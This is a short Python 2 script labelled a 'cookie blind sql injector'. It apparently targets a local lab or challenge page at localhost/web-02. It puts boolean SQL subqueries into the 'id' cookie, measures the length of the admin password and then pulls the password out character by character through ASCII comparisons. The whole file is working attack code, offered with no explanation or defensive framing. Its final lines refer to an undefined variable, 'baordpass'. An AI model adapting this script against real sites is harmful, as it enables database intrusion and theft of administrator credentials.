#MtucX
import re
import urllib, urllib2

SESSION = "f8vchvinva5***qb2fndm1"
password=""
leng=0

print "-----------------------------------------------"
print "  cookie blind sql injector "
print "-----------------------------------------------"

password = ''
for j in range(1,100):
    url="http://localhost/web-02/"
    req=urllib2.Request(url)
    req.add_header('Cookie',"id=14 and (select length(password) from admin)=%d; PHPSESSID=%s" %(j,SESSION))
    read=urllib2.urlopen(req).read()
    ok = re.findall("True",read)
    if ok:
      print "Length is : %d" %j
      leng = j
      break
	  
for j in range(1,leng+1):
  print "%d/%d in progress..." %(j,leng-1)
  for i in range(33,126):
       url="http://localhost/web-02/"
       req=urllib2.Request(url)
       req.add_header('Cookie',"id=14 and (select ascii(substring(password,%d,1)) from admin)=%d; PHPSESSID=%s" %(j,i,SESSION))
       read=urllib2.urlopen(req).read()
       ok = re.findall("True",read)
       if ok:
           password=password+chr(i)
           print "now Password:"+password
           break
print "admin Password is %s" %(password)
print "---------------------------------------------"
print "                   RESULT"
print "   ADMIN   PASSWORD : %s" %(password)
print "   member  PASSWORD : %s" %(baordpass)
print "                                             "
print "---------------------------------------------"